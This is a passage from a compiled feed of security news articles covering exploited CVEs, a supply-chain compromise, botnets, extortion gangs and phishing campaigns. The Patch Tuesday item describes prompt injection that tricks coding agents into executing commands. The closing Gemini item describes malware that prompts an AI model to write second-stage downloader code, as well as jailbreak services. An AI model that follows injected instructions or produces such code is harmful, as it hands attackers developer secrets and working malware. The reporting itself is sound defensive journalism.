However, the Windows maker said it's not evident if the attacks exploited CVE-2025-40551, CVE-2025-40536, or CVE-2025-26399, since attacks occurred in December 2025 and on machines vulnerable to both the old and new sets of vulnerabilities.

As for CVE-2026-20700, Apple acknowledged that the shortcoming may have been exploited in an extremely sophisticated attack against specific targeted individuals on versions of iOS before iOS 26, raising the possibility that it was leveraged to deliver commercial spyware. It was fixed by the tech giant earlier this week.

Lastly, the exploitation of CVE-2025-15556 has been attributed by Rapid7 to a China-linked state-sponsored threat actor called Lotus Blossom (aka Billbug, Bronze Elgin, G0030, Lotus Panda, Raspberry Typhoon, Spring Dragon, and Thrip). It's known to be active since at least 2009.

The targeted attacks have been found to deliver a previously undocumented backdoor called Chrysalis. While the supply chain attack was fully plugged on December 2, 2025, the compromise of the Notepad++ update pipeline is estimated to have spanned nearly five months between June and October 2025.

The DomainTools Investigations (DTI) team described the incident as precise and a "quiet, methodical intrusion" that points to a covert intelligence-gathering mission designed to keep operational noise as low as possible. It also characterized the threat actor as having a penchant for long dwell times and multi-year campaigns.

An important aspect of the campaign is that the Notepad++ source code was left intact, instead relying on trojanized installers to deliver the malicious payloads. This, in turn, allowed the attackers to bypass source-code reviews and integrity checks, effectively enabling them to stay undetected for extended periods, DTI added.

"From their foothold inside the update infrastructure, the attackers did not indiscriminately push malicious code to the global Notepad++ user base," it said. "Instead, they exercised restraint, selectively diverting update traffic for a narrow set of targets, organizations, and individuals whose positions, access, or technical roles made them strategically valuable."

"By abusing a legitimate update mechanism relied upon specifically by developers and administrators, they transformed routine maintenance into a covert entry point for high-value access. The campaign reflects continuity in purpose, a sustained focus on regional strategic intelligence, executed with more sophisticated, more subtle, and harder-to-detect methods than in prior iterations."

In light of active exploitation of these vulnerabilities, Federal Civilian Executive Branch (FCEB) agencies have until February 15, 2026, to address CVE-2025-40536, and till March 5, 2026, to fix the remaining three.

Microsoft has fixed a known issue causing its Family Safety parental control service to block Windows users from launching Google Chrome and other web browsers.

Family Safety helps parents monitor their children's activity and provides screen time management, app controls, communication monitoring, content filtering, location tracking, and activity reports.

Microsoft acknowledged the bug in late June 2025 after widespread reports that users were unable to launch Google Chrome on their PCs or experienced the web browser randomly crashing on devices running Windows 10 22H2 and Windows 11 22H2 or later.

As explained at the time, the issue is caused by Family Safety's web filtering tool, which prompts children to ask their parents for approval to use other browsers. However, the bug also causes Family Safety to block new versions of previously approved web browsers, inadvertently preventing them from launching or causing them to shut down unexpectedly.

"The blocking behavior continues to work, however, when a browser updates to a new version, the latest version of the browser cannot be blocked until we add it to the block list. Microsoft is currently adding the latest versions of Chrome and other browsers to the block list," the company notes on the Windows release health dashboard.

"As Microsoft continues to update the block list, we've received reports of a new issue affecting Google Chrome and some browsers. When children try to open these browsers, they shut down unexpectedly."

Service‑side fix pushed in early February

This week, Microsoft confirmed that it addressed the issue with a service‑side fix earlier this month, nearly eight months after first receiving reports of web browsers shutting down unexpectedly.

Affected users are advised to connect their devices to the Internet to receive the fix, which should address the bug and prevent similar problems in the future.

"This issue has been resolved through a service‑side fix. The rollout began early February 2026 and should reach all affected devices over the coming weeks," Microsoft said. "If your device presented this symptom, please let it connect to the internet to receive the resolution. No other action is required."

Those who can't get online to receive the fix are advised to turn on the 'Activity reporting' feature under Windows settings in Microsoft Family Safety, which will allow parents to receive approval requests as expected and allowlist newer browser versions.

[5] BleepingComputer - Russia tries to block WhatsApp, Telegram in communication blockade
────────────────────────────────────────────────────────────────────────────────
Tarih: Thu, 12 Feb 2026 17:57:54 -0500

[TAM METİN - 436 kelime]
The Russian government is trying to block WhatsApp in the country as its crackdown on communication platforms outside its control intensifies.

WhatsApp announced the action against it on X, calling it “a backwards step” that “can only lead to less safety for people in Russia.”

WhatsApp assured its Russian users that it will continue doing everything it can to keep them connected.

According to Russian media, the country’s internet watchdog, Roskomnadzor, had recently excluded the domains whatsapp.com and web.whatsapp.com from the National Domain Name System, citing the official explanation of countering crime and fraud.

In practice, excluding the domains from domestic DNS routing made WhatsApp services accessible only to users who use VPN tools or external resolvers.

However, more aggressive measures are reportedly now in place, with the latest attempt to fully block WhatsApp in Russia. The instant messenger's parent company, Meta, has been designated as an “extremist” entity in Russia since 2022.

WhatsApp saw its first restrictions in the country in August 2025, when Roskomnadzor began throttling voice and video calls. In October 2025, the authorities attempted to block new user registrations.

Presidential press secretary Dmitry Peskov reportedly stated that the authorities are open to allowing WhatsApp to resume operations in the country, provided that Meta complies with local legislation.

WhatsApp blocks came shortly after similar action was taken against Telegram, which was reportedly aggressively throttled earlier this week in Russia.

Telegram’s founder, Pavel Durov, responded to the situation by stating that Russia is trying to encourage its citizens to use the Kremlin-controlled MAX messenger app.

MAX is a controversial communications platform developed by VK, which became mandatory on all electronic devices sold in the country since September 2025.

Although MAX is promoted as a secure app that safeguards national communications from foreign surveillance, several independent reviewers have raised concerns about encryption weaknesses, government access, and extensive data-collection risks.

For now, users in Russia may be able to continue accessing their messengers of choice by using VPN tools, though those are not immune to the government’s crackdown either.

[6] BleepingComputer - Bitwarden introduces ‘Cupid Vault’ for secure password sharing
────────────────────────────────────────────────────────────────────────────────

[TAM METİN - 413 kelime]
Bitwarden has launched a new system called ‘Cupid Vault’ that allows users to safely share passwords with trusted email addresses.

Cupid Vault works by allowing users of the free version of Bitwarden to create a 2-person shared vault called an 'Organization'. Other users can access the logins inside the Organization space with credentials assigned by the owner of the account.

Inviting a user (partner, friend, family member) to an Organization can be done by adding their email address as a second member.

This way, Bitwarden users can share in a secure way collections of login pairs for media streaming service accounts or other online platforms.

Setting up an Organization and creating shared collections is possible by logging into the Bitwarden vault via the web interface.

To prevent adversary-in-the-middle enrollment attacks, vault owners can verify through a fingerprint phrase that the intended member is getting access. The shared vault is completely isolated from the personal vault.

Access to the Organization vault and the secrets it contains can be revoked at any time, and sharing can be configured in both directions.

Bitwarden published a detailed guide on how to set up and use Cupid Vault, which explains that ownership of items within a new Organization isn’t tied to their creator, as both members can perform editing or deletion actions.

Bitwarden is a popular open-source password manager that lets users securely store, generate, and autofill passwords and other sensitive information.

It’s cross-platform, supporting a range of browsers, desktop operating systems, and mobile platforms, and protects stored data using end-to-end encryption.

The new Cupid Vault feature, launched ahead of Valentine’s Day, is available at no charge to all users and can be set up through the free plan. However, there’s a limit of 2 Collections and 2 users each.

Family, Teams, and Enterprise plan users already get multiple users, collections, and granular role-based access control permissions, so Cupid Vault is redundant for paying tiers and shouldn’t be confused with the secret-sharing features available to them.

[7] Krebs on Security - Kimwolf Botnet Swamps Anonymity Network I2P
────────────────────────────────────────────────────────────────────────────────
Tarih: Wed, 11 Feb 2026 16:08:11 +0000
Link: https://krebsonsecurity.com/2026/02/kimwolf-botnet-swamps-anonymity-network-i2p/

[TAM METİN - 831 kelime]
For the past week, the massive “Internet of Things” (IoT) botnet known as Kimwolf has been disrupting The Invisible Internet Project (I2P), a decentralized, encrypted communications network designed to anonymize and secure online communications. I2P users started reporting disruptions in the network around the same time the Kimwolf botmasters began relying on it to evade takedown attempts against the botnet’s control servers.

Kimwolf is a botnet that surfaced in late 2025 and quickly infected millions of systems, turning poorly secured IoT devices like TV streaming boxes, digital picture frames and routers into relays for malicious traffic and abnormally large distributed denial-of-service (DDoS) attacks.

I2P is a decentralized, privacy-focused network that allows people to communicate and share information anonymously.

“It works by routing data through multiple encrypted layers across volunteer-operated nodes, hiding both the sender’s and receiver’s locations,” the I2P website explains. “The result is a secure, censorship-resistant network designed for private websites, messaging, and data sharing.”

On February 3, I2P users began complaining on the organization’s GitHub page about tens of thousands of routers suddenly overwhelming the network, preventing existing users from communicating with legitimate nodes. Users reported a rapidly increasing number of new routers joining the network that were unable to transmit data, and that the mass influx of new systems had overwhelmed the network to the point where users could no longer connect.

I2P users complaining about service disruptions from a rapidly increasing number of routers suddenly swamping the network.

When one I2P user asked whether the network was under attack, another user replied, “Looks like it. My physical router freezes when the number of connections exceeds 60,000.”

A graph shared by I2P developers showing a marked drop in successful connections on the I2P network around the time the Kimwolf botnet started trying to use the network for fallback communications.

The same day that I2P users began noticing the outages, the individuals in control of Kimwolf posted to their Discord channel that they had accidentally disrupted I2P after attempting to join 700,000 Kimwolf-infected bots as nodes on the network.

The Kimwolf botmaster openly discusses what they are doing with the botnet in a Discord channel with my name on it.

Although Kimwolf is known as a potent weapon for launching DDoS attacks, the outages caused this week by some portion of the botnet attempting to join I2P are what’s known as a “Sybil attack,” a threat in peer-to-peer networks where a single entity can disrupt the system by creating, controlling, and operating a large number of fake, pseudonymous identities.

Indeed, the number of Kimwolf-infected routers that tried to join I2P this past week was many times the network’s normal size. I2P’s Wikipedia page says the network consists of roughly 55,000 computers distributed throughout the world, with each participant acting as both a router (to relay traffic) and a client.

However, Lance James, founder of the New York City based cybersecurity consultancy Unit 221B and the original founder of I2P, told KrebsOnSecurity the entire I2P network now consists of between 15,000 and 20,000 devices on any given day.

An I2P user posted this graph on Feb. 10, showing tens of thousands of routers — mostly from the United States — suddenly attempting to join the network.

Benjamin Brundage is founder of Synthient, a startup that tracks proxy services and was the first to document Kimwolf’s unique spreading techniques. Brundage said the Kimwolf operator(s) have been trying to build a command and control network that can’t easily be taken down by security companies and network operators that are working together to combat the spread of the botnet.

Brundage said the people in control of Kimwolf have been experimenting with using I2P and a similar anonymity network — Tor — as a backup command and control network, although there have been no reports of widespread disruptions in the Tor network recently.

“I don’t think their goal is to take I2P down,” he said. “It’s more they’re looking for an alternative to keep the botnet stable in the face of takedown attempts.”

The Kimwolf botnet created challenges for Cloudflare late last year when it began instructing millions of infected devices to use Cloudflare’s domain name system (DNS) settings, causing control domains associated with Kimwolf to repeatedly usurp Amazon, Apple, Google and Microsoft in Cloudflare’s public ranking of the most frequently requested websites.

James said the I2P network is still operating at about half of its normal capacity, and that a new release is rolling out which should bring some stability improvements over the next week for users.

Meanwhile, Brundage said the good news is Kimwolf’s overlords appear to have quite recently alienated some of their more competent developers and operators, leading to a rookie mistake this past week that caused the botnet’s overall numbers to drop by more than 600,000 infected systems.

“It seems like they’re just testing stuff, like running experiments in production,” he said. “But the botnet’s numbers are dropping significantly now, and they don’t seem to know what they’re doing.”

[8] Krebs on Security - Patch Tuesday, February 2026 Edition
────────────────────────────────────────────────────────────────────────────────

[TAM METİN - 515 kelime]
Microsoft today released updates to fix more than 50 security holes in its Windows operating systems and other software, including patches for a whopping six “zero-day” vulnerabilities that attackers are already exploiting in the wild.

Zero-day #1 this month is CVE-2026-21510, a security feature bypass vulnerability in Windows Shell wherein a single click on a malicious link can quietly bypass Windows protections and run attacker-controlled content without warning or consent dialogs. CVE-2026-21510 affects all currently supported versions of Windows.

The zero-day flaw CVE-2026-21513 is a security bypass bug targeting MSHTML, the proprietary engine of the default Web browser in Windows. CVE-2026-21514 is a related security feature bypass in Microsoft Word.

The zero-day CVE-2026-21533 allows local attackers to elevate their user privileges to “SYSTEM” level access in Windows Remote Desktop Services. CVE-2026-21519 is a zero-day elevation of privilege flaw in the Desktop Window Manager (DWM), a key component of Windows that organizes windows on a user’s screen. Microsoft fixed a different zero-day in DWM just last month.

The sixth zero-day is CVE-2026-21525, a potentially disruptive denial-of-service vulnerability in the Windows Remote Access Connection Manager, the service responsible for maintaining VPN connections to corporate networks.

Chris Goettl at Ivanti reminds us Microsoft has issued several out-of-band security updates since January’s Patch Tuesday. On January 17, Microsoft pushed a fix that resolved a credential prompt failure when attempting remote desktop or remote application connections. On January 26, Microsoft patched a zero-day security feature bypass vulnerability (CVE-2026-21509) in Microsoft Office.

Kev Breen at Immersive notes that this month’s Patch Tuesday includes several fixes for remote code execution vulnerabilities affecting GitHub Copilot and multiple integrated development environments (IDEs), including VS Code, Visual Studio, and JetBrains products. The relevant CVEs are CVE-2026-21516, CVE-2026-21523, and CVE-2026-21256.

Breen said the AI vulnerabilities Microsoft patched this month stem from a command injection flaw that can be triggered through prompt injection, or tricking the AI agent into doing something it shouldn’t — like executing malicious code or commands.

“Developers are high-value targets for threat actors, as they often have access to sensitive data such as API keys and secrets that function as keys to critical infrastructure, including privileged AWS or Azure API keys,” Breen said. “When organizations enable developers and automation pipelines to use LLMs and agentic AI, a malicious prompt can have significant impact. This does not mean organizations should stop using AI. It does mean developers should understand the risks, teams should clearly identify which systems and workflows have access to AI agents, and least-privilege principles should be applied to limit the blast radius if developer secrets are compromised.”

The SANS Internet Storm Center has a clickable breakdown of each individual fix this month from Microsoft, indexed by severity and CVSS score. Enterprise Windows admins involved in testing patches before rolling them out should keep an eye on askwoody.com, which often has the skinny on wonky updates. Please don’t neglect to back up your data if it has been a while since you’ve done that, and feel free to sound off in the comments if you experience problems installing any of these fixes.

[9] Krebs on Security - Please Don’t Feed the Scattered Lapsus ShinyHunters

[TAM METİN - 1200 kelime]
A prolific data ransom gang that calls itself Scattered Lapsus ShinyHunters (SLSH) has a distinctive playbook when it seeks to extort payment from victim firms: Harassing, threatening and even swatting executives and their families, all while notifying journalists and regulators about the extent of the intrusion. Some victims reportedly are paying — perhaps as much to contain the stolen data as to stop the escalating personal attacks. But a top SLSH expert warns that engaging at all beyond a “We’re not paying” response only encourages further harassment, noting that the group’s fractious and unreliable history means the only winning move is not to pay.

Unlike traditional, highly regimented Russia-based ransomware affiliate groups, SLSH is an unruly and somewhat fluid English-language extortion gang that appears uninterested in building a reputation of consistent behavior whereby victims might have some measure of confidence that the criminals will keep their word if paid.

That’s according to Allison Nixon, director of research at the New York City based security consultancy Unit 221B. Nixon has been closely tracking the criminal group and individual members as they bounce between various Telegram channels used to extort and harass victims, and she said SLSH differs from traditional data ransom groups in other important ways that argue against trusting them to do anything they say they’ll do — such as destroying stolen data.

Like SLSH, many traditional Russian ransomware groups have employed high-pressure tactics to force payment in exchange for a decryption key and/or a promise to delete stolen data, such as publishing a dark web shaming blog with samples of stolen data next to a countdown clock, or notifying journalists and board members of the victim company. But Nixon said the extortion from SLSH quickly escalates way beyond that — to threats of physical violence against executives and their families, DDoS attacks on the victim’s website, and repeated email-flooding campaigns.

SLSH is known for breaking into companies by phishing employees over the phone, and using the purloined access to steal sensitive internal data. In a January 30 blog post, Google’s security forensics firm Mandiant said SLSH’s most recent extortion attacks stem from incidents spanning early to mid-January 2026, when SLSH members pretended to be IT staff and called employees at targeted victim organizations claiming that the company was updating MFA settings.

“The threat actor directed the employees to victim-branded credential harvesting sites to capture their SSO credentials and MFA codes, and then registered their own device for MFA,” the blog post explained.

Victims often first learn of the breach when their brand name is uttered on whatever ephemeral new public Telegram group chat SLSH is using to threaten, extort and harass their prey. According to Nixon, the coordinated harassment on the SLSH Telegram channels is part of a well-orchestrated strategy to overwhelm the victim organization by manufacturing humiliation that pushes them over the threshold to pay.

Nixon said multiple executives at targeted organizations have been subject to “swatting” attacks, wherein SLSH communicated a phony bomb threat or hostage situation at the target’s address in the hopes of eliciting a heavily armed police response at their home or place of work.

“A big part of what they’re doing to victims is the psychological aspect of it, like harassing executives’ kids and threatening the board of the company,” Nixon told KrebsOnSecurity. “And while these victims are getting extortion demands, they’re simultaneously getting outreach from media outlets saying, ‘Hey, do you have any comments on the bad things we’re going to write about you.”

In a blog post today, Unit 221B argues that no one should negotiate with SLSH because the group has demonstrated a willingness to extort victims based on promises that it has no intention to keep. Nixon points out that all of SLSH’s known members hail from The Com, shorthand for a constellation of cybercrime-focused Discord and Telegram communities which serve as a kind of distributed social network that facilitates instant collaboration.

Nixon said Com-based extortion groups tend to instigate feuds and drama between group members, leading to lying, betrayals, credibility destroying behavior, backstabbing, and sabotaging each other.

“With this type of ongoing dysfunction, often compounding by substance abuse, these threat actors often aren’t able to act with the core goal in mind of completing a successful, strategic ransom operation,” Nixon wrote. “They continually lose control with outbursts that put their strategy and operational security at risk, which severely limits their ability to build a professional, scalable, and sophisticated criminal organization network for continued successful ransoms – unlike other, more tenured and professional criminal organizations focused on ransomware alone.”

Intrusions from established ransomware groups typically center around encryption/decryption malware that mostly stays on the affected machine. In contrast, Nixon said, ransom from a Com group is often structured the same as violent sextortion schemes against minors, wherein members of The Com will steal damaging information, threaten to release it, and “promise” to delete it if the victim complies without any guarantee or technical proof point that they will keep their word. She writes:

A key component of SLSH’s efforts to convince victims to pay, Nixon said, involves manipulating the media into hyping the threat posed by this group. This approach also borrows a page from the playbook of sextortion attacks, she said, which encourages predators to keep targets continuously engaged and worrying about the consequences of non-compliance.

“On days where SLSH had no substantial criminal ‘win’ to announce, they focused on announcing death threats and harassment to keep law enforcement, journalists, and cybercrime industry professionals focused on this group,” she said.

Nixon knows a thing or two about being threatened by SLSH: For the past several months, the group’s Telegram channels have been replete with threats of physical violence against her, against Yours Truly, and against other security researchers. These threats, she said, are just another way the group seeks to generate media attention and achieve a veneer of credibility, but they are useful as indicators of compromise because SLSH members tend to name drop and malign security researchers even in their communications with victims.

“Watch for the following behaviors in their communications to you or their public statements,” Unit 221B’s advisory reads. “Repeated abusive mentions of Allison Nixon (or “A.N”), Unit 221B, or cybersecurity journalists—especially Brian Krebs—or any other cybersecurity employee, or cybersecurity company. Any threats to kill, or commit terrorism, or violence against internal employees, cybersecurity employees, investigators, and journalists.”

Unit 221B says that while the pressure campaign during an extortion attempt may be traumatizing to employees, executives, and their family members, entering into drawn-out negotiations with SLSH incentivizes the group to increase the level of harm and risk, which could include the physical safety of employees and their families.

“The breached data will never go back to the way it was, but we can assure you that the harassment will end,” Nixon said. “So, your decision to pay should be a separate issue from the harassment. We believe that when you separate these issues, you will objectively see that the best course of action to protect your interests, in both the short and long term, is to refuse payment.”

[10] Threatpost - Student Loan Breach Exposes 2.5M Records
────────────────────────────────────────────────────────────────────────────────
Tarih: Wed, 31 Aug 2022 12:57:48 +0000

[TAM METİN - 511 kelime]
2.5 million people were affected, in a breach that could spell more trouble down the line.

EdFinancial and the Oklahoma Student Loan Authority (OSLA) are notifying over 2.5 million loanees that their personal data was exposed in a data breach.

The target of the breach was Nelnet Servicing, the Lincoln, Neb.-based servicing system and web portal provider for OSLA and EdFinancial, according to a breach disclosure letter.

Nelnet revealed the breach to affected loan recipients on July 21, 2022 via a letter.

“[Our] cybersecurity team took immediate action to secure the information system, block the suspicious activity, fix the issue, and launched[sic] an investigation with third-party forensic experts to determine the nature and scope of the activity,” according to the letter.

By August 17th, the investigation determined that personal user information was accessed by an unauthorized party. That exposed information included names, home addresses, email addresses, phone numbers and social security numbers for a total of 2,501,324 student loan account holders. Users’ financial information was not exposed.

According to a breach disclosure filing submitted by Nelnet’s general counsel, Bill Munn, to the state of Maine the breach occurred sometime between June 1, 2022 and July 22, 2022. However, a letter to affected customers pinpoints the breach to July 21. The breach was discovered on August 17, 2022.

“On July 21, 2022, Nelnet Servicing, LLC (Nelnet), our servicing system and customer website

portal provider, notified us that they had discovered a vulnerability that we believe led to this incident,” according to the Nelnet.

It’s unclear what the vulnerability was.

“On August 17, 2022, this investigation determined that certain student loan account registration information was accessible by an unknown party beginning in June 2022 and ending on July 22, 2022,” according to the letter.

Loan Recipient Targets

Although users’ most sensitive financial data was protected, the personal information that was accessed in the Nelnet breach “has potential to be leveraged in future social engineering and phishing campaigns,” explained Melissa Bischoping, endpoint security research specialist at Tanium, in a statement via email.

“With recent news of student loan forgiveness, it’s reasonable to expect the occasion to be used by scammers as a gateway for criminal activity,” Bischoping said.

Last week, the Biden administration announced a plan to cancel $10,000 of student loan debt for low- and middle-income loanees. She said the loan forgiveness program will be used to lure victims into opening up phishing emails.

She warns that recently breached data will be used to impersonate affected brands in waves of phishing campaigns targeting students and recent college graduates.

“Because they can leverage the trust from existing business relationships they can be particularly deceptive,” she wrote.

According to the breach disclosure Nelnet Servicing informed Edfinancial and OSLA that Nelnet Servicing’s cybersecurity team “took immediate action to secure the information system, block the suspicious activity, fix the issue, and launched an investigation with third-party forensic experts to determine the nature and scope of the activity.”

Remediation also included two years of free credit monitoring, credit reports and up to $1 million in identity theft insurance.

[11] Threatpost - Watering Hole Attacks Push ScanBox Keylogger
────────────────────────────────────────────────────────────────────────────────
Tarih: Tue, 30 Aug 2022 16:00:43 +0000
Link: https://threatpost.com/watering-hole-attacks-push-scanbox-keylogger/180490/

[TAM METİN - 918 kelime]
Researchers uncover a watering hole attack likely carried out by APT TA423, which attempts to plant the ScanBox JavaScript-based reconnaissance tool.

A China-based threat actor has ramped up efforts to distribute the ScanBox reconnaissance framework to victims that include domestic Australian organizations and offshore energy firms in the South China Sea. The bait used by the advanced threat group (APT) is targeted messages that supposedly link back to Australian news websites.

The cyber-espionage campaigns are believed to have launched April 2022 through mid-June 2022, according to a Tuesday report by Proofpoint’s Threat Research Team and PwC’s Threat Intelligence team.

The threat actor, according to researchers, is believed to be the China-based APT TA423, also known as Red Ladon. “Proofpoint assesses with moderate confidence that this activity may be attributable to the threat actor TA423 / Red Ladon, which multiple reports assess to operate out of Hainan Island, China,” according to the report.

The APT is most recently known for a recent indictment. “A 2021 indictment by the US Department of Justice assessed that TA423 / Red Ladon provides long-running support to the Hainan Province Ministry of State Security (MSS),” researchers said.

MSS is the civilian intelligence, security and cyber police agency for the People’s Republic of China. It is believed responsible for counter-intelligence, foreign intelligence, political security and tied to industrial and cyber espionage efforts by China.

Dusting Off the ScanBox

The campaign leverages the ScanBox framework. ScanBox is a customizable and multifunctional Javascript-based framework used by adversaries to conducting covert reconnaissance.

ScanBox has been used by adversaries for nearly a decade and is noteworthy because criminals can use the tool to conduct counter intelligence without having to plant malware on a targets system.

“ScanBox is particularly dangerous as it doesn’t require malware to be successfully deployed to disk in order to steal information – the keylogging functionality simply requires the JavaScript code to be executed by a web browser,” according to PwC researchers referring to a previous campaign.

In lieu of malware, attackers can use ScanBox in conjunction with watering hole attacks. Adversaries load the malicious JavaScript onto a compromised website where the ScanBox acts as a keylogger snagging all of a user’s typed activity on the infected watering hole website.

TA423’s attacks began with phishing emails, with such titles as “Sick Leave,” “User Research” and “Request Cooperation.” Often, the emails purported to come from an employee of the “Australian Morning News,” a fictional organization. The employee implored targets to visit their “humble news website,” australianmorningnews[.]com.

“Upon clicking the link and redirecting to the site, visitors were served the ScanBox framework,” researchers wrote.

The link directed targets to a web page with content copied from actual news sites, like the BBC and Sky News. In the process, it also delivered the ScanBox malware framework.

ScanBox keylogger data culled from waterholes is part of a multi-stage attack, giving attackers insight into the potential targets that will help them launch future attacks against them. This technique is often called browser fingerprinting.

The primary, initial script sources a list of information about the target computer, including the operating system, language and version of Adobe Flash installed. ScanBox additionally runs a check for browser extensions, plugins and components such WebRTC.

“The module implements WebRTC, a free and open-source technology supported on all major browsers, which allows web browsers and mobile applications to perform real-time communication (RTC) over application programming interfaces (APIs). This allows ScanBox to connect to a set of pre-configured targets,” researchers explain.

Adversaries can then leverage a technology called STUN (Session Traversal Utilities for NAT). This is a standardized set of methods, including a network protocol, that allows interactive communications (including real-time voice, video, and messaging applications) to traverse network address translator (NAT) gateways, researchers explain.

“STUN is supported by the WebRTC protocol. Through a third-party STUN server located on the Internet, it allows hosts to discover the presence of a NAT, and to discover the mapped IP address and port number that the NAT has allocated for the application’s User Datagram Protocol (UDP) flows to remote hosts. ScanBox implements NAT traversal using STUN servers as part of Interactive Connectivity Establishment (ICE), a peer-to-peer communication method used for clients to communicate as directly as possible, avoiding having to communicate through NATs, firewalls, or other solutions,” according to researchers.

“This means that the ScanBox module can set up ICE communications to STUN servers, and communicate with victim machines even if they are behind NAT,” they explain.

The threat actors “support the Chinese government in matters related to the South China Sea, including during the recent tensions in Taiwan,” Sherrod DeGrippo, vice president of threat research and detection at Proofpoint, explained in a statement, “This group specifically wants to know who is active in the region and, while we can’t say for certain, their focus on naval issues is likely to remain a constant priority in places like Malaysia, Singapore, Taiwan, and Australia.”

The group has, in the past, expanded well beyond Australasia. According to a Department of Justice indictment from July, 2021, the group has “stolen trade secrets and confidential business information” from victims in “the United States, Austria, Cambodia, Canada, Germany, Indonesia, Malaysia, Norway, Saudi Arabia, South Africa, Switzerland and the United Kingdom. Targeted industries included, among others, aviation, defense, education, government, health care, biopharmaceutical and maritime.”

Despite the DoJ indictment, analysts “have not observed a distinct disruption of operational tempo” from TA423, and they “collectively expect TA423 / Red Ladon to continue pursuing its intelligence-gathering and espionage mission.”

[12] Threatpost - Tentacles of ‘0ktapus’ Threat Group Victimize 130 Firms
────────────────────────────────────────────────────────────────────────────────
Tarih: Mon, 29 Aug 2022 14:56:19 +0000
Link: https://threatpost.com/0ktapus-victimize-130-firms/180487/

[TAM METİN - 614 kelime]
Over 130 companies tangled in sprawling phishing campaign that spoofed a multi-factor authentication system.

Targeted attacks on Twilio and Cloudflare employees are tied to a massive phishing campaign that resulted in 9,931 accounts at over 130 organizations being compromised. The campaigns are tied to focused abuse of identity and access management firm Okta, which gained the threat actors the 0ktapus moniker, by researchers.

“The primary goal of the threat actors was to obtain Okta identity credentials and multi-factor authentication (MFA) codes from users of the targeted organizations,” wrote Group-IB researchers in a recent report. “These users received text messages containing links to phishing sites that mimicked the Okta authentication page of their organization.”

Impacted were 114 US-based firms, with additional victims of sprinkled across 68 additional countries.

Roberto Martinez, senior threat intelligence analyst at Group-IB, said the scope of the attacks is still an unknown. “The 0ktapus campaign has been incredibly successful, and the full scale of it may not be known for some time,” he said.

What the 0ktapus Hackers Wanted

The 0ktapus attackers are believed to have begun their campaign by targeting telecommunications companies in hopes of winning access to potential targets’ phone numbers.

While unsure exactly how threat actors obtained a list of phone numbers used in MFA-related attacks, one theory researchers posit is that 0ktapus attackers began their campaign targeting telecommunications companies.

“[A]ccording to the compromised data analyzed by Group-IB, the threat actors started their attacks by targeting mobile operators and telecommunications companies and could have collected the numbers from those initial attacks,” researchers wrote.

Next, attackers sent phishing links to targets via text messages. Those links led to webpages mimicking the Okta authentication page used by the target’s employer. Victims were then asked to submit Okta identity credentials in addition to a multi-factor authentication (MFA) codes employees used to secure their logins.

In an accompanying technical blog, researchers at Group-IB explain that the initial compromises of mostly software-as-a-service firms were a phase-one in a multi-pronged attack. 0ktapus’ ultimate goal was to access company mailing lists or customer-facing systems in hopes of facilitating supply-chain attacks.

In a possible related incident, within hours of Group-IB publishing its report late last week, the firm DoorDash revealed it was targeted in an attack with all the hallmarks of an 0ktapus-style attack.

Blast Radius: MFA Attacks

In a blog post DoorDash revealed; “unauthorized party used the stolen credentials of vendor employees to gain access to some of our internal tools.” The attackers, according to the post, went on to steal personal information – including names, phone numbers, email and delivery addresses – from customers and delivery people.

In the course of its campaign, the attacker compromised 5,441 MFA codes, Group-IB reported.

“Security measures such as MFA can appear secure… but it is clear that attackers can overcome them with relatively simple tools,” researchers wrote.

“This is yet another phishing attack showing how easy it is for adversaries to bypass supposedly secure multifactor authentication,” Roger Grimes, data-driven defense evangelist at KnowBe4, wrote in a statement via email. “It simply does no good to move users from easily phish-able passwords to easily phish-able MFA. It’s a lot of hard work, resources, time, and money, not to get any benefit.”

To mitigate 0ktapus-style campaigns, the researchers recommended good hygiene around URLs and passwords, and using FIDO2-compliant security keys for MFA.

“Whatever MFA someone uses,” Grimes advised, “the user should be taught about the common types of attacks that are committed against their form of MFA, how to recognize those attacks, and how to respond. We do the same when we tell users to pick passwords but don’t when we tell them to use supposedly more secure MFA.”

[13] Security Affairs - Google: state-backed hackers exploit Gemini AI for cyber recon and attacks
────────────────────────────────────────────────────────────────────────────────
Tarih: Fri, 13 Feb 2026 10:57:30 +0000
Link: https://securityaffairs.com/187958/ai/google-state-backed-hackers-exploit-gemini-ai-for-cyber-recon-and-attacks.html

[TAM METİN - 639 kelime]
Google DeepMind and GTIG report a rise in model extraction or “distillation” attacks aimed at stealing AI intellectual property, which Google has detected and blocked. While APT groups have not breached frontier models, private firms and researchers have tried to clone proprietary systems. State-backed actors from North Korea, Iran, China, and Russia use AI for research, targeting, and phishing. Threat actors also test agentic AI, AI-powered malware like HONESTCUE, and underground “jailbreak” services.

Threat actors now use large language models to craft polished, culturally accurate phishing messages that remove common red flags like poor grammar. They also run “rapport-building” phishing, holding realistic multi-step conversations to gain trust before delivering malware.

Google reported that North Korea-linked hacker group UNC2970 used its Gemini AI model to gather intelligence on targets and support cyber operations. The company also said other threat groups now weaponize generative AI to speed up attack stages, run information operations, and even attempt model extraction attacks.

“The North Korean government-backed actor UNC2970 has consistently focused on defense targeting and impersonating corporate recruiters in their campaigns. The group used Gemini to synthesize OSINT and profile high-value targets to support campaign planning and reconnaissance.” reads the report published by Google. “This actor’s target profiling included searching for information on major cybersecurity and defense companies and mapping specific technical job roles and salary information. “

Iran-linked group APT42 also used generative AI tools like Gemini to boost reconnaissance and targeted social engineering. The group searched for official email addresses, researched organizations to build believable pretexts, and created tailored personas based on target biographies. The nation-state actor also used AI for language translation and understanding local context. Google disrupted the activity and disabled related assets.

In September 2025, Google tracked new malware called HONESTCUE that uses the Gemini API to generate malicious C# code on demand. Instead of storing full payloads, the malware sends prompts to Gemini, receives source code for a second-stage downloader, compiles it in memory with .NET tools, and executes it without writing files to disk. This fileless approach helps evade detection. Attackers also host payloads on platforms like Discord CDN. Researchers believe a single actor or small group is testing this AI-assisted malware as a proof of concept.

In November 2025, GTIG found COINBAIT, a phishing kit built with help from AI. It pretends to be a major crypto exchange to steal login details. Some of the activity links to UNC5356, a group known for SMS and phone phishing. The kit was likely created using Lovable AI and built as a complex React website. It includes detailed “? Analytics:” logs that show how it tracks and steals data. The attackers hid their systems behind Cloudflare and trusted services to avoid detection. COINBAIT shows a move toward modern web tools and cloud services, may be used by different groups, and also connects to AI-hosted ClickFix scams that trick users into installing malware like ATOMIC.

Underground forums show strong demand for AI tools built for cybercrime. Since most threat actors cannot build their own models, they rely on established services like Gemini. One example, Xanthorox, claimed to be a private custom AI for malware and phishing, but it actually ran on commercial and open-source AI tools layered together.

Attackers need stolen API keys to scale abuse, creating risks for organizations using cloud AI services. Criminals often exploit weak security in open-source AI platforms to steal and resell API keys, fueling a black market.

